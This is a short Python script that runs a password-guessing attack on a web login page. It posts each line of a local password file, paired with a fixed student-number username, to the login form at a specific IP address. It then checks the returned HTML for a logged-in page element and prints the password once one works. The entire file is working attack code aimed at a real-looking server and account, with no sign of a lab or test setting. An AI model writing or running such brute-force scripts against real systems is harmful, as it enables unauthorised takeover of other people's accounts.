import requests
from bs4 import BeautifulSoup
import sys

passFile=open('F:/pwd.txt')

url = 'http://113.55.4.18/login/index.php'

for line in passFile.readlines():
    password = line.strip('\n')
    params = {"username": 20161120004, "password": password}
    html=requests.post(url,data=params)
    #print(html.text)
    soup = BeautifulSoup(html.text,'lxml')
    #print(soup.prettify())
    p = soup.find_all(class_='tree_item leaf hasicon')
    print(p)
    if p == []:
        #print("failed")
        continue
    else:
        print("succeed")
        print("密码：",password)
        sys.exit(0)